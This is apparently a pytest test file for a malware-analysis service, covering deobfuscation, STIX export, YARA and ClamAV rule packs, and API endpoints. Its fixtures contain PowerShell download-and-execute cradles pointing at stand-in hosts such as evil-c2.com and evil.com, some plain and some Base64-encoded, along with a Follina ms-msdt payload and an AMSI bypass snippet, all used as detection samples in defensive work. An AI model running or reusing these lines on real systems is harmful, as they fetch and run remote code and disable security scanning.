import pytest
import os
import json
from fastapi.testclient import TestClient
from app.main import app
from app.core.job_manager import JobManager, JobModel
from app.analyzers.deobfuscator import Deobfuscator
from app.analyzers.stix_exporter import Stix21Exporter
from app.core.yara_manager import yara_manager
from app.core.clamav_manager import clamav_manager


def test_deobfuscator_single_byte_xor_brute_force():
    """Verify single-byte XOR brute-force scanner detects plaintext anchor and key."""
    # Plaintext payload containing anchor
    plaintext = b"powershell.exe -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://evil-c2.com/stage2.ps1')"
    xor_key = 0x5A
    xor_encrypted = bytes([b ^ xor_key for b in plaintext])

    results = Deobfuscator.xor_brute_force(xor_encrypted)
    assert len(results) >= 1
    found_candidate = next((r for r in results if r["key_decimal"] == xor_key), None)
    assert found_candidate is not None
    assert "0x5A" == found_candidate["key_hex"]
    assert any(anchor in ["powershell", "http://", "Net.WebClient", "DownloadString"] for anchor in found_candidate["matched_anchors"])
    assert "http://evil-c2.com/stage2.ps1" in found_candidate["extracted_urls"]


def test_deobfuscator_base64_utf16le_powershell():
    """Verify Base64 scanner decodes UTF-16LE PowerShell -EncodedCommand and discovers IOCs."""
    import base64
    raw_cmd = "IEX(New-Object Net.WebClient).DownloadString('https://malicious-domain.xyz/payload.exe'); $ip = '198.51.100.45'"
    utf16_bytes = raw_cmd.encode("utf-16le")
    b64_str = base64.b64encode(utf16_bytes).decode("ascii")

    full_script = f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {b64_str}"
    results = Deobfuscator.scan_for_base64_blocks(full_script)
    assert len(results) >= 1
    target = results[0]
    assert "UTF-16LE" in target["encoding"]
    assert "DownloadString" in target["decoded"]
    assert "https://malicious-domain.xyz/payload.exe" in target["extracted_urls"]
    assert "198.51.100.45" in target["extracted_ips"]


def test_deobfuscator_full_payload_analysis():
    """Verify Deobfuscator.analyze_payload integrates all decoders."""
    text = "echo 'nothing suspicious here'; var a = 'aHR0cHM6Ly9zdGVhbGVyLmNvbS9leGZpbHRyYXRl'; eval(a);"
    res = Deobfuscator.analyze_payload(text)
    assert res["has_deobfuscated_content"] is True
    assert len(res["base64_blocks"]) >= 1
    assert "https://stealer.com/exfiltrate" in res["extracted_urls"]


def test_stix_21_bundle_generation():
    """Verify Stix21Exporter produces valid OASIS STIX 2.1 JSON bundle."""
    jm = JobManager()
    job = jm.create_job(file_bytes=b"MZ\x90\x00\x03\x00\x00\x00PE\x00\x00 malware test", raw_filename="trojan.exe")
    job.hashes = {"sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "md5": "d41d8cd98f00b204e9800998ecf8427e"}
    job.mitre_attack = [
        {"technique_id": "T1059.001", "technique_name": "PowerShell", "tactic": "Execution", "matched_indicator": "PowerShell execution"},
        {"technique_id": "T1027", "technique_name": "Obfuscated Files or Information", "tactic": "Defense Evasion", "matched_indicator": "XOR encrypted stream"}
    ]
    job.urls = [{"url": "http://c2-infrastructure.com/beacon", "risk": "MALICIOUS"}]
    job.clamav = {"virus_name": "Win.Trojan.Generic-102"}

    bundle = Stix21Exporter.generate_bundle(job)
    assert bundle["type"] == "bundle"
    assert bundle["id"].startswith("bundle--")
    objects = bundle["objects"]

    types = [o["type"] for o in objects]
    assert "identity" in types
    assert "file" in types
    assert "indicator" in types
    assert "attack-pattern" in types
    assert "malware" in types
    assert "relationship" in types

    file_obj = next(o for o in objects if o["type"] == "file")
    assert file_obj["name"] == "trojan.exe"
    assert "SHA-256" in file_obj["hashes"]

    malware_obj = next(o for o in objects if o["type"] == "malware")
    assert malware_obj["name"] == "Win.Trojan.Generic-102"


def test_yara_community_packs_and_cve_rules():
    """Verify community YARA packs catalog, import, and detection of CVE rules."""
    packs = yara_manager.get_community_packs()
    assert len(packs) == 3
    pack_ids = [p["id"] for p in packs]
    assert "yara-forge-core" in pack_ids
    assert "yaralrules-exploits" in pack_ids
    assert "threat-actor-scripts" in pack_ids

    # Import pack
    import_res = yara_manager.import_community_pack("yaralrules-exploits")
    assert import_res["success"] is True

    # Test Follina CVE-2022-30190 detection
    follina_payload = b'<xml xmlns:r="rel"><Relationship Target="ms-msdt:/id PCWDiagnostic /skip force /param IT_BrowseForFile=calc.exe IT_LaunchMethod=ShellExec" /></xml>'
    matches = yara_manager.scan_bytes(follina_payload, category="OFFICE")
    assert any("Follina" in m["rule_name"] or "MSDT" in m["rule_name"] for m in matches)

    # Test AMSI bypass detection
    amsi_payload = b'$a = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils"); $f = $a.GetField("amsiInitFailed","NonPublic,Static"); $f.SetValue($null,$true)'
    matches_amsi = yara_manager.scan_bytes(amsi_payload, category="ALL")
    assert any("AMSI" in m["rule_name"] for m in matches_amsi)


def test_clamav_community_packs_installation():
    """Verify ClamAV community signature pack installation."""
    res_sane = clamav_manager.install_community_pack("sanesecurity")
    assert res_sane["success"] is True
    assert res_sane["filename"] == "sanesecurity_foxhole_scam.ndb"

    res_urlhaus = clamav_manager.install_community_pack("urlhaus")
    assert res_urlhaus["success"] is True
    assert res_urlhaus["filename"] == "urlhaus.ndb"


def test_api_stix_and_deobfuscate_endpoints():
    """Verify /api/jobs/{id}/stix-export and /api/jobs/{id}/deobfuscate endpoints."""
    client = TestClient(app)
    jm = JobManager()
    sample_content = b"echo 'test'; powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
    job = jm.create_job(file_bytes=sample_content, raw_filename="dropper.sh")
    jm.execute_analysis_pipeline(job.job_id)

    # Test STIX Export
    stix_resp = client.get(f"/api/jobs/{job.job_id}/stix-export")
    assert stix_resp.status_code == 200
    bundle = stix_resp.json()
    assert bundle["type"] == "bundle"
    assert len(bundle["objects"]) >= 2

    # Test Deobfuscate endpoint
    deobf_resp = client.post(f"/api/jobs/{job.job_id}/deobfuscate", json={})
    assert deobf_resp.status_code == 200
    deobf_data = deobf_resp.json()
    assert deobf_data["has_deobfuscated_content"] is True
    assert "http://evil.com/payload.ps1" in deobf_data["extracted_urls"]
